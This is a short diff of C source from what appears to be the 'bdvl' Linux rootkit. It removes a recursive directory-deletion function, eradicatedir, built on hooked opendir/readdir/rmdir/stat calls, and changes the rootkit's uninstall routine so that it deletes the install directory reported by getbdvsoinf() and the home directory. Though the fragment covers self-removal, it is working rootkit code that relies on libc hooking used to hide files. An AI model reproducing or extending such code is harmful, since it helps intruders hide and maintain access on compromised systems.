@@ -1,34 +1,3 @@
-/* recursively removes the target directory. */
-void eradicatedir(const char *target){
-    DIR *dp;
-    struct dirent *dir;
-    struct stat pathstat;
-
-    hook(COPENDIR, CREADDIR, CRMDIR, C__XSTAT);
-
-    dp = call(COPENDIR, target);
-    if(dp == NULL) return;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
-            continue;
-
-        char path[strlen(target)+strlen(dir->d_name)+2];
-        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
-
-        memset(&pathstat, 0, sizeof(struct stat));
-        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
-            if(S_ISDIR(pathstat.st_mode))
-                eradicatedir(path); // we recursive.
-
-        if(rm(path) < 0)
-            printf("Failed unlink on %s\n", path);
-    }
-    closedir(dp);
-    if((long)call(CRMDIR, target) < 0 && errno != ENOENT && errno != ENOTDIR)
-        printf("Failed rmdir on %s\n", target);
-}
-
 #ifdef UNINSTALL_MY_ASS
 /* read each line in the contents of ASS_PATH.
  * if the line is a hidden path, i.e. one of ours,
@@ -158,7 +127,12 @@ void uninstallbdv(void){
 #endif
 
     printf("Eradicating directories\n");
-    eradicatedir(INSTALL_DIR);
+    so = getbdvsoinf();
+    if(so != NULL){
+        eradicatedir(so->installdir);
+        free(so);
+        so = NULL;
+    }else eradicatedir(INSTALL_DIR);
     eradicatedir(HOMEDIR);
 
     printf("Removing bdvl paths\n");
